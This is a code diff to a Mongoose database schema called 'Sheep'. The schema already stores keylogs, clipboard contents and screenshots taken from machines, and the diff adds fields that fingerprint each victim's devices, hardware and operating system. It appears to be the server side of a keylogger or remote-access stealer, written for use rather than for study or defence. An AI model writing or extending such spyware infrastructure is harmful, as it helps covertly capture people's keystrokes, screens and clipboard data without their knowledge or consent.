@@ -13,6 +13,17 @@ interface ISheep extends Document {
     keylog: { keylogDate: Date; data: string }[];
     clipboard: { clipboardDate: Date; data: string }[];
     screenshot: { screenshotDate: Date; file: Buffer }[];
+    devices: string[];
+    hardware: {
+        cpu: string;
+        ram: string;
+        storage: string;
+        gpu: string;
+    };
+    os: {
+        name: string;
+        version: string;
+    };
 }
 
 // Schema definition for keylog, clipboard, and screenshot entries
@@ -44,6 +55,17 @@ const sheepSchema: Schema = new Schema({
     keylog: { type: [keylogSchema], required: false, default: [] },
     clipboard: { type: [clipboardSchema], required: false, default: [] },
     screenshot: { type: [screenshotSchema], required: false, default: [] },
+    devices: { type: [String], required: false, default: [] },
+    hardware: {
+        cpu: { type: String, required: false },
+        ram: { type: String, required: false },
+        storage: { type: String, required: false },
+        gpu: { type: String, required: false },
+    },
+    os: {
+        name: { type: String, required: false },
+        version: { type: String, required: false },
+    },
 });
 
 // Model definition for Sheep
